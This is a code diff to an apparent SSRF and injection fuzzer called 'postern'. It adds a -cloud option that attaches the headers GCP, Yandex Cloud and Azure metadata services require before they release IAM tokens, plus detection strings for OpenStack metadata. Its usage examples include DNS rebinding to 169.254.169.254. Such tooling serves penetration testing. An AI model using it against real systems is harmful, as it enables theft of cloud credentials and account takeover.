@@ -83,6 +83,7 @@ type config struct {
 	timing           bool
 	listParams       bool
 	silent           bool
+	cloud            string
 	extraHdrs        headerList
 }
 
@@ -178,6 +179,8 @@ TARGET:
   -tls                    use TLS when -url is not given
   -proxy <host:port>      route every request through an HTTP proxy (Burp)
   -H <"Name: Value">      add a header to every request  (repeatable)
+  -cloud <preset>         metadata preset, sets the required header:
+                          gcp|yandex (Metadata-Flavor: Google), azure, all
 
 INJECTION:
   -p <name|auto|all>      parameter to fuzz, or auto / all; else FUZZ marker
@@ -240,6 +243,9 @@ EXAMPLES:
 
   # SSRF: let postern pick the candidate parameters
   postern -r req.txt -mode ssrf -p auto -interactsh
+
+  # Yandex Cloud / GCP metadata (token needs the Metadata-Flavor header)
+  postern -r req.txt -mode ssrf -p url -cloud yandex
 
   # SSRF to cloud metadata via DNS rebinding (TOCTOU bypass)
   postern -r req.txt -mode ssrf -p url -rebind 1.2.3.4:169.254.169.254
@@ -354,6 +360,7 @@ func parseFlags() *config {
 	flag.IntVar(&cfg.maxErrors, "max-errors", 25, "circuit breaker: consecutive errors / sustained slow responses before auto-stop")
 	flag.IntVar(&cfg.retries, "retries", 1, "retries on network error before recording a result (a transient reset != closed port)")
 	flag.BoolVar(&cfg.timing, "timing", false, "flag slow responses as hits (blind-timing signal; off by default - noisy on jittery links)")
+	flag.StringVar(&cfg.cloud, "cloud", "", "metadata preset - adds the provider's required header: gcp|yandex|azure|all")
 	flag.Var(&cfg.extraHdrs, "H", "extra header for every request (repeatable): -H 'Name: Value'")
 	flag.Parse()
 	return cfg
@@ -387,6 +394,20 @@ func run(cfg *config) error {
 	}
 
 	base.UpsertHeader("Connection", "close")
+	// -cloud preset: GCP-style metadata (incl. Yandex Cloud) needs
+	// "Metadata-Flavor: Google"; Azure needs "Metadata: true". Without the header
+	// those endpoints refuse the IAM token, so set it for the whole run.
+	switch strings.ToLower(strings.TrimSpace(cfg.cloud)) {
+	case "":
+	case "gcp", "gce", "yandex":
+		cfg.extraHdrs = append(cfg.extraHdrs, "Metadata-Flavor: Google")
+	case "azure":
+		cfg.extraHdrs = append(cfg.extraHdrs, "Metadata: true")
+	case "all":
+		cfg.extraHdrs = append(cfg.extraHdrs, "Metadata-Flavor: Google", "Metadata: true")
+	default:
+		return fmt.Errorf("unknown -cloud preset %q (use gcp|yandex|azure|all)", cfg.cloud)
+	}
 	for _, h := range cfg.extraHdrs {
 		ci := strings.IndexByte(h, ':')
 		if ci < 0 {
@@ -1125,6 +1146,8 @@ func humanizeStrong(reasons []string) string {
 				return "reached GCP metadata / token"
 			case strings.Contains(m, "vmid"), strings.Contains(m, "subscriptionid"), strings.Contains(m, "\"compute\":"):
 				return "reached Azure metadata"
+			case strings.Contains(m, "availability_zone"), strings.Contains(m, "random_seed"), strings.Contains(m, "securitytoken"):
+				return "reached OpenStack metadata (VK/SberCloud/Selectel)"
 			case strings.Contains(m, "redis_version"), strings.Contains(m, "+pong"), strings.Contains(m, "stat pid"):
 				return "reached an internal service (Redis/Memcached)"
 			case strings.Contains(m, "ssh-2.0"), strings.Contains(m, "ssh-1.99"), strings.Contains(m, "vsftpd"), strings.Contains(m, "proftpd"), strings.Contains(m, "esmtp"):
